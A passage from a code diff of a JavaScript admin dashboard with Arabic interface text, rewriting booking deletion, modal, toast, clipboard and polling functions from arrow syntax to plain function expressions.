+  if (!confirm("هل تريد حذف هذا الحجز نهائيا؟")) return;
+  sbDelete("visitors", id).then(function() {
+    showToast("تم حذف الحجز");
+    loadOrders();
+  });
 }
 
-async function deleteOrder(id) {
-  if (!confirm("هل تريد حذف هذا الطلب نهائياً؟")) return;
-  await sbDelete("visitors", id);
-  showToast("تم حذف الطلب");
-  loadOrders();
-}
-
-// ─── Modal helpers ───
 function openModal(id) { document.getElementById(id).classList.add("open"); }
 function closeModal(id) { document.getElementById(id).classList.remove("open"); }
-document.querySelectorAll(".modal-overlay").forEach(el => {
-  el.addEventListener("click", e => { if (e.target === el) el.classList.remove("open"); });
+document.querySelectorAll(".modal-overlay").forEach(function(el) {
+  el.addEventListener("click", function(e) { if (e.target === el) el.classList.remove("open"); });
 });
 
-// ─── Toast ───
 function showToast(msg) {
-  const el = document.getElementById("toast");
+  var el = document.getElementById("toast");
   el.textContent = msg;
   el.classList.add("show");
-  setTimeout(() => el.classList.remove("show"), 2500);
+  setTimeout(function() { el.classList.remove("show"); }, 2500);
 }
 
-// ─── Copy ───
 function copyText(text) {
-  navigator.clipboard.writeText(text).then(() => showToast("تم النسخ: " + text));
+  navigator.clipboard.writeText(text).then(function() { showToast("تم النسخ: " + text); });
 }
 
-// ─── Init ───
 checkAuth();
-setInterval(() => {
+setInterval(function() {
   if (AUTHED) {
     loadOrders();
     loadActiveVisitors();
